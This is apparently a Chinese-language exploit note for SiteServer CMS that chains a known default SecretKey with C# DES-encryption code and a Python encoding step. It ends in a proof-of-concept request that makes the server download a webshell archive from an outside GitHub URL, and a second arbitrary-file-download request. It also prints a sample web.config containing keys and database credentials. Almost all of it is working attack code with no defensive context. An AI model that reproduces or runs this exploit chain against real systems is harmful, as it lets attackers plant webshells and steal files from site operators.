## siteserver 远程下载getshell

####  一、SecretKey获取
	SecretKey在5.0
	默认值vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5

	SecretKey6.0 web.config获取SecretKey
	<add key="SecretKey" value="f2d915aa5756985f" />
	<add key="DatabaseType" value="SqlServer" />
	<add key="ConnectionString" value="Server=.;Uid=admin;Pwd=123456;Database=Appoa;" />

#### 二、加密工具
	using System; 
	using System.IO; 
	using System.Security.Cryptography; 
	using System.Text; 
	namespace EncryptApplication 
	{ class Encrypt 
    	{ static void Main(string[] args) 
      		{ 
        		var _encryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5"; 
        		var _decryptKey = "vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5";
        		var _inputString = "https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/webshell/poxteam.zip";
        		var _outString = ""; var _noteMessage = "";
        		byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
        		try{ 
           			var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length > 8 ? _encryptKey.Substring(0, 8) : _encryptKey); 
          			var des = new DESCryptoServiceProvider(); 
          			var inputByteArray = Encoding.UTF8.GetBytes(_inputString); 
					var ms = new MemoryStream(); 
					var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write);     cs.Write(inputByteArray, 0, inputByteArray.Length);
					cs.FlushFinalBlock();
					_outString = Convert.ToBase64String(ms.ToArray()); 
					Console.WriteLine("DesEncrypt:"); Console.WriteLine(_outString); }
      			catch (Exception error) { _noteMessage = error.Message; } 
	} } }


	python处理结果
		str_decry = "aZlBAFKTavCnFX10p8sNYfr9FRNHM/XP8EW1kEnDr4pNGA7T2XSz0yCY+MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ+gNU9tDxOqBwAd37smw=="
		
		str_decry = str_decry.replace("+", "0add0").replace("=", "0equals0").replace("&", "0and0").replace("?", "0question0").replace("/", "0slash0")

		print str_decry


#### 三、下载模版getshell POC
	http://localhost/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest

#### 四、任意文件下载POC
	http://127.0.0.1/api/sys/stl/actions/download?filePath=







